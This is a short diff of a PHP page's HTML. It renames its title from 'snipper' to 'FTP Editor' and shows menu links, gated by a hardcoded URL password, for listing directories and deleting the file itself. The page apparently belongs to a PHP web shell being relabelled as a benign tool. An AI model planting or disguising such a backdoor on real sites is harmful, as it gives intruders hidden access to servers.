@@ -101,7 +101,7 @@
 		<html lang="en">
 		<head>
 			<meta charset="UTF-8">
-			<title>snipper</title>
+			<title>FTP Editor</title>
 			<style>
 				body{
 					background-color: #000b0e;
@@ -134,7 +134,7 @@
 			</style>
 		</head>
 		<body>
-			<p style="text-align: center;">welcome snipper<br>-------------------------<br><br></p>
+			<p style="text-align: center;">FTP Editor<br>-------------------------<br><br></p>
 			<ul id='menu'>
 				<li><a href="<?php echo basename($_SERVER['PHP_SELF']); ?>?pass=vishwajeetkumar&do=listdir"">Directory Structure</a></li>
 				<li><a href="<?php echo basename($_SERVER['PHP_SELF']); ?>?pass=vishwajeetkumar&do=deleteself" onclick="return confirm('Are you sure you want to delete self?');">Delete Self</a></li>
